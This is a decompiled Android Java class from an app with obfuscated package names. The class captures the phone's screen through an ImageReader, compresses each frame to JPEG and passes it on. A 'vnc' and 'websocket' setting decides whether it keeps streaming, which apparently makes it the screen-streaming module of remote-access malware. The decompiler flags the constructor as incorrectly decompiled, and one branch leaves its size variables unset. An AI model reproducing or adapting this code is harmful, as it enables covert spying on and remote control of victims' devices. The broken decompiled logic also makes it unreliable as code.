package wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy;

import android.annotation.TargetApi;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Point;
import android.media.Image;
import android.media.ImageReader;
import android.view.Display;
import android.view.Surface;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import wocwvy.czyxoxmbauu.slsa.C0020b;

/* JADX INFO: renamed from: wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.a */
/* JADX INFO: loaded from: classes.dex */
@TargetApi(21)
public class C0062a implements ImageReader.OnImageAvailableListener {

    /* JADX INFO: renamed from: b */
    private final int f544b;

    /* JADX INFO: renamed from: c */
    private final int f545c;

    /* JADX INFO: renamed from: d */
    private final ImageReader f546d;

    /* JADX INFO: renamed from: e */
    private final jkeggfql f547e;

    /* JADX INFO: renamed from: f */
    private Bitmap f548f = null;

    /* JADX INFO: renamed from: a */
    C0020b f543a = new C0020b();

    /* JADX WARN: Removed duplicated region for block: B:5:0x002a  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    C0062a(jkeggfql jkeggfqlVar) {
        int i;
        int i2;
        this.f547e = jkeggfqlVar;
        Display defaultDisplay = jkeggfqlVar.m337a().getDefaultDisplay();
        Point point = new Point();
        defaultDisplay.getSize(point);
        int i3 = point.x;
        int i4 = point.y;
        if (i3 <= 0 || i3 > 800) {
            if (i3 > 800 && i3 <= 1600) {
                i = point.x / 3;
                i2 = point.y / 3;
            } else if (i3 > 1600) {
                i = point.x / 4;
                i2 = point.y / 4;
            } else {
                i = point.x / 2;
                i2 = point.y / 2;
            }
        }
        while (i * i2 > 1048576) {
            i >>= 1;
            i2 >>= 1;
        }
        this.f544b = i;
        this.f545c = i2;
        this.f546d = ImageReader.newInstance(i, i2, 1, 2);
        this.f546d.setOnImageAvailableListener(this, jkeggfqlVar.m339b());
    }

    /* JADX INFO: renamed from: a */
    Surface m330a() {
        return this.f546d.getSurface();
    }

    /* JADX INFO: renamed from: b */
    int m331b() {
        return this.f544b;
    }

    /* JADX INFO: renamed from: c */
    int m332c() {
        return this.f545c;
    }

    @Override // android.media.ImageReader.OnImageAvailableListener
    public void onImageAvailable(ImageReader imageReader) {
        Image imageAcquireLatestImage = this.f546d.acquireLatestImage();
        if (imageAcquireLatestImage != null) {
            Image.Plane[] planes = imageAcquireLatestImage.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = this.f544b + ((planes[0].getRowStride() - (this.f544b * pixelStride)) / pixelStride);
            if (this.f548f == null || this.f548f.getWidth() != rowStride || this.f548f.getHeight() != this.f545c) {
                if (this.f548f != null) {
                    this.f548f.recycle();
                }
                this.f548f = Bitmap.createBitmap(rowStride, this.f545c, Bitmap.Config.ARGB_8888);
            }
            this.f548f.copyPixelsFromBuffer(buffer);
            if (imageAcquireLatestImage != null) {
                imageAcquireLatestImage.close();
            }
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            Bitmap.createBitmap(this.f548f, 0, 0, this.f544b, this.f545c).compress(Bitmap.CompressFormat.JPEG, 100, byteArrayOutputStream);
            byte[] byteArray = byteArrayOutputStream.toByteArray();
            if (this.f543a.m251e(this.f547e, "vnc").equals("stop") || this.f543a.m251e(this.f547e, "websocket").equals("")) {
                this.f547e.stopForeground(true);
                this.f547e.stopService(this.f547e.f550a);
            } else {
                this.f547e.m338a(byteArray);
                this.f547e.startService(new Intent(this.f547e, (Class<?>) nvsdtnxkzjgw.class));
            }
        }
    }
}
